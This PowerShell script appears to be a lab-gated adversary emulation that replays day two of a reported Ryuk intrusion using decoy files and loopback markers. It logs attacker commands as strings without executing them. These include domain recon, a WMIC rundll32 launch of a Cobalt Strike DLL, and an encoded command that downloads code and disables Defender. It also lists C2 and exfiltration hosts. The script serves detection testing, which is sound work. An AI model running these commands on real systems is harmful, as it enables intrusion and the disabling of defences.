#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\RyukReturnSim-utilities.ps1"
Assert-RRSafety -LabConfirmed:$LabConfirmed;$p=Initialize-RREnvironment
$adfind=Join-Path $p.Payloads 'AdFind.exe';$rubeus=Join-Path $p.Payloads 'Rubeus.exe';$arti=Join-Path $p.Payloads 'arti64.dll';$p64=Join-Path $p.Payloads 'P64.exe';$wmic=Join-Path $p.Payloads 'wmic.exe';$service=Join-Path $p.Payloads 'service-runner.exe';$powershell=Join-Path $p.Payloads 'powershell.exe'
if(-not(Test-Path -LiteralPath $adfind)){New-RRDecoy -Path $adfind -Role 'AdFind stand-in'}
New-RRDecoy -Path $rubeus -Role 'Rubeus stand-in'
New-RRDecoy -Path $arti -Role 'Cobalt Strike arti64 DLL stand-in' -PublishedSha256 'f22449c01f8233ea7c85a49f2b6b5fedd304fca5c0e58176bafda9218873c2dd'
New-RRDecoy -Path $p64 -Role 'Cobalt Strike executable stand-in' -PublishedSha256 '9d8cbb2bf4801276de2143ccd64a7d0f66263809a90bea0b664282a15d121d9e'
foreach($pair in @(@($wmic,'WMI telemetry stand-in'),@($service,'remote-service telemetry stand-in'),@($powershell,'PowerShell telemetry stand-in'))){New-RRDecoy -Path $pair[0] -Role $pair[1]}
Invoke-RRDecoy -FilePath $adfind -Reported 'AdFind and adf.bat executed again on day two' -Parent 'Bazar shell' -Label 'SYNTHETIC-DAY2-ADFIND'
Invoke-RRDecoy -FilePath $rubeus -Reported 'Rubeus Kerberoast attempt and output collection' -Parent 'Bazar shell' -Label 'NO-KERBEROAST'
Write-RRJson -Path(Join-Path $p.Staging 'day2-discovery-and-rubeus.json')-Object([ordered]@{AdFindOutput='synthetic';RubeusOutput='synthetic marker only';ticketsRequested=0;credentialsOrHashesCollected=0})-Purpose synthetic-discovery-output
Invoke-RRLoopback -Port 21 -Target '45.141.84.120 (vsftpd)' -Role 'AdFind and Rubeus output exfiltration marker'
Write-RRJson -Path(Join-Path $p.Evidence 'ftp-exfiltration.json')-Object([ordered]@{reportedServer='45.141.84.120';reportedService='vsftpd';reportedData=@('AdFind outputs','Rubeus output');sourceFilesSynthetic=$true;ftpSessions=0;bytesTransferred=0;externalConnections=0})-Purpose exfiltration

$recon=@('systeminfo','nltest /dclist:','Get-NetSubnet','Get-NetComputer -operatingsystem *server*','Invoke-CheckLocalAdminAccess','Find-LocalAdminAccess','WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List','Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties * | select Name,DNSHostName,OperatingSystem,LastLogonDate | Export-CSV C:\Users\AllWindows.csv -NoTypeInformation -Encoding UTF8')
foreach($command in $recon){Invoke-RRDecoy -FilePath $powershell -Reported $command -Parent 'Bazar/Cobalt operator shell' -Label 'SYNTHETIC-LOCAL-RECON'}
Write-RRFile -Path(Join-Path $p.Staging 'AllWindows.csv')-Content "Name,DNSHostName,OperatingSystem,LastLogonDate`nDC01-CANARY,dc01-canary.lab-canary.local,Windows Server CANARY,2020-09-30T00:00:00Z`nBAK01-CANARY,bak01-canary.lab-canary.local,Windows Server CANARY,2020-09-30T00:00:00Z" -Purpose synthetic-discovery-output
Write-RRJson -Path(Join-Path $p.Evidence 'day2-recon.json')-Object([ordered]@{reportedCommands=$recon;PowerViewExecuted=$false;PowerShellExecuted=$false;WmiQueries=0;directoryQueries=0;localAdminChecks=0;syntheticCsv=(Join-Path $p.Staging 'AllWindows.csv')})-Purpose discovery

Write-RRJson -Path(Join-Path $p.Evidence 'ms17-010-marker.json')-Object([ordered]@{reportedTarget='domain controller';reportedResult='not vulnerable';packetsSent=0;hostsScanned=0;exploitAttempts=0})-Purpose discovery
$dc=New-RRHostTree -Name 'DC01-CANARY' -Role 'generated Cobalt pivot domain-controller representation'
$attempts=@('WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"','remote service execution with PowerShell after failed WMI DLL attempt','SMB copy and service execution of P64.exe on DC01-CANARY')
Invoke-RRDecoy -FilePath $wmic -Reported $attempts[0] -Parent 'beachhead host' -Label 'NO-WMI'
Invoke-RRDecoy -FilePath $powershell -Reported $attempts[1] -Parent 'remote service attempt' -Label 'NO-POWERSHELL'
Invoke-RRDecoy -FilePath $service -Reported $attempts[2] -Parent 'services.exe on reported DC' -Label 'NO-SERVICE'
Invoke-RRDecoy -FilePath $p64 -Reported 'Cobalt Strike beacon P64.exe copied over SMB and initiated by service on the DC' -Parent 'reported remote services.exe' -Label 'SYNTHETIC-COBALT'
Write-RRJson -Path(Join-Path $p.Evidence 'lateral-movement.json')-Object([ordered]@{reportedStartMinutes=1680;reportedAttempts=$attempts;generatedDc=$dc;reportedRemoteMount='dir \\Server\c$';WmiCalls=0;PowerShellExecuted=$false;smbSessions=0;remoteFilesWritten=0;servicesCreated=0;remoteMounts=0})-Purpose lateral-movement
Invoke-RRLoopback -Port 445 -Target 'DC.example.domain and \\Server\c$' -Role 'SMB and remote-mount marker'
Invoke-RRLoopback -Port 135 -Target 'DC.example.domain' -Role 'WMI RPC marker'
Invoke-RRLoopback -Port 443 -Target 'martahzz.com (88.119.171.75)' -Role 'DC Cobalt C2 marker'
Invoke-RRLoopback -Port 443 -Target 'nomadfunclub.com (107.173.58.183)' -Role 'Cobalt C2 marker'

$encoded='SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA3ADgAMAAxAC8AJwApADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='
Invoke-RRDecoy -FilePath $powershell -Reported "powershell -nop -exec bypass -EncodedCommand $encoded" -Parent 'Cobalt Strike beacon' -Label 'NO-DEFENDER-CHANGE'
Write-RRJson -Path(Join-Path $p.Evidence 'defender-disable-marker.json')-Object([ordered]@{reportedEncodedCommand=$encoded;reportedDecodedBehavior='IEX from 127.0.0.1:7801 then Set-MpPreference -DisableRealtimeMonitoring true';PowerShellExecuted=$false;MpPreferenceChanged=$false;securityControlsChanged=0;localListenerContacted=0})-Purpose defense-evasion
Add-RRTimeline 1530 discovery 'Day-two AdFind, Rubeus, PowerView, WMI antivirus, and AD-computer discovery represented' @{ticketsRequested=0;directoryQueries=0;PowerShellExecuted=$false}
Add-RRTimeline 1560 exfiltration 'Synthetic AdFind and Rubeus outputs represented as vsftpd exfiltration' @{ftpSessions=0;bytesTransferred=0}
Add-RRTimeline 1680 lateral-movement 'Movement begins around hour 28 with failed WMI and PowerShell-service attempts' @{WmiCalls=0;servicesCreated=0;remoteFilesWritten=0}
Add-RRTimeline 1700 lateral-movement 'SMB executable and service method establishes reported DC pivot' @{smbSessions=0;servicesCreated=0;generatedDc=$dc}
Add-RRTimeline 1715 defense-evasion 'Encoded Defender-disable command represented' @{PowerShellExecuted=$false;securityControlsChanged=0}
Write-RRJson -Path(Join-Path $p.Evidence 'phase2-negative.json')-Object([ordered]@{ticketsRequested=0;credentialsOrHashesCollected=0;ftpSessions=0;bytesTransferred=0;hostsScanned=0;exploitAttempts=0;WmiCalls=0;PowerShellExecuted=$false;smbSessions=0;remoteFilesWritten=0;servicesCreated=0;remoteMounts=0;securityControlsChanged=0;externalConnections=0})-Purpose safety
